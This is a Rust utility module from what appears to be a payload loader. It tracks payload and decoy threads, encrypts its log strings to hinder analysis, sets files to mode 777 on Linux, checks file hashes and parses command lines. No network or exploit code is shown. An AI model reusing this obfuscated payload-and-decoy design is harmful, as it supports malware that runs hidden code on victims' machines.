use crate::payload::PO;
use crate::rundata::RunData;
use crate::utils::expand_arg;

use anyhow::Result;
use chksum_sha2_512 as sha2_512;
use serde::{Deserialize, Serialize};
use std::env;
use std::fs;
use std::fs::create_dir_all;
use std::fs::File;
use std::io::prelude::*;
#[cfg(target_os = "linux")]
use std::os::unix::fs::PermissionsExt;
use std::path::PathBuf;
use std::thread;

use cryptify::encrypt_string;
use log::error;
use log::info;

#[cfg(target_os = "linux")]
use obfstr::obfstr;

#[cfg(target_os = "linux")]
pub fn set_permission(data_write_path: &PathBuf) {
    if cfg!(target_os = obfstr!("linux")) {
        info!("{}{:?}", encrypt_string!("setpermision: "), data_write_path);
        std::fs::set_permissions(data_write_path, std::fs::Permissions::from_mode(0o777)).unwrap();
    };
}

//#[cfg(target_os = "windows")]
//pub fn set_permission(_data_write_path: &String) {}

pub fn same_hash_sha512(hash: &String, path: &PathBuf) -> bool {
    if *hash == "".to_string() {
        return false;
    }

    let mut f = match File::open(path) {
        Ok(f) => f,
        Err(_) => return false,
    };
    let mut buffer: Vec<u8> = Vec::new();

    // read the whole file
    match f.read_to_end(&mut buffer) {
        Ok(_) => (),
        Err(_) => return false,
    };
    let digest = sha2_512::chksum(buffer).unwrap();

    digest.to_hex_lowercase() == *hash
}

pub fn print_rundata(run_data: &mut RunData) {
    info!("{}", encrypt_string!("[+] PRINT RUN_DATA"));
    print_running_thread(
        &mut run_data.running_thread_payload,
        encrypt_string!("payload thread"),
    );
    print_runonce(&mut run_data.runonce_payload, encrypt_string!("payload"));

    print_running_thread(
        &mut run_data.running_thread_decoy_update,
        encrypt_string!("decoy update thread"),
    );
    print_runonce(
        &mut run_data.runonce_decoy_update,
        encrypt_string!("decoy update"),
    );

    print_running_thread(
        &mut run_data.running_thread_decoy_payload,
        encrypt_string!("decoy payload thread"),
    );
    print_runonce(
        &mut run_data.runonce_decoy_payload,
        encrypt_string!("decoy payload"),
    );
}

pub fn print_running_thread(
    running_thread: &mut Vec<(thread::JoinHandle<()>, PO)>,
    msg: String,
) {
    if running_thread.len() != 0 {
        info!(
            "{}{}: {}",
            encrypt_string!("[+] RUNNING "),
            msg,
            running_thread.len()
        );
        #[cfg(debug_assertions)]
        for i in running_thread {
            #[cfg(debug_assertions)]
            info!("{}{}", encrypt_string!("-thread: "), serde_json::to_string(&i.1).unwrap_or_default() );
        }
    } else {
        info!("{}{}", encrypt_string!("[+] no RUNNING "), msg);
    };
}

pub fn print_runonce(runonce: &mut Vec<PO>, msg: String) {
    if runonce.len() != 0 {
        info!(
            "{}{}: {}",
            encrypt_string!("[+] RUNONCE "),
            msg,
            runonce.len()
        );
        #[cfg(debug_assertions)]
        for i in runonce {
            #[cfg(debug_assertions)]
            info!("{}{}", encrypt_string!("-runonce: "), serde_json::to_string(i).unwrap_or_default());
        }
    } else {
        info!("{}{}", encrypt_string!("[+] no RUNONCE "), msg);
    };
}

pub fn fail_linux_message(message: String) {
    error!(
        "{}{}",
        encrypt_string!("Its linux, impossible to run the payload: "),
        message
    );
}

#[derive(PartialEq, Serialize, Deserialize, Clone)]
pub enum CommandLine {
    ArgParse(),
    Txt(String),
}

impl CommandLine {
    pub fn get_buffer(&self) -> Result<Vec<String>, anyhow::Error> {
        match self.clone() {
            CommandLine::ArgParse() => Ok(env::args().collect()),
            //CommandLine::Txt(commandline) => Ok(shlex::split(&commandline).ok_or(anyhow::anyhow!("shlex failed"))?),
            CommandLine::Txt(commandline) => shlex::split(&expand_arg(&commandline)?)
                .ok_or(anyhow::anyhow!(encrypt_string!("shlex get_buffer failed"))),
        }
    }
    pub fn get_string(&self) -> Result<String, anyhow::Error> {
        match self.clone() {
            CommandLine::ArgParse() => {
                let args: Vec<String> = env::args().collect();
                Ok(args.join(" "))
            }
            CommandLine::Txt(commandline) => expand_arg(&commandline),
        }
    }
}

//TODO il faudrait aussi ajouter BINFILE et BINPATH ici:

pub fn create_directory(path: &PathBuf) -> Result<(), anyhow::Error> {
    match path.parent() {
        Some(parent_dir) => {
            if fs::metadata(parent_dir).is_ok() == false {
                info!(
                    "{}{:?}",
                    encrypt_string!("[+] path not exist, create: "),
                    parent_dir
                );
                create_dir_all(parent_dir)?;
            }
        }
        None => error!(
            "{}{:?}",
            encrypt_string!("error, impossible to retreive parent path: "),
            path
        ),
    };
    Ok(())
}
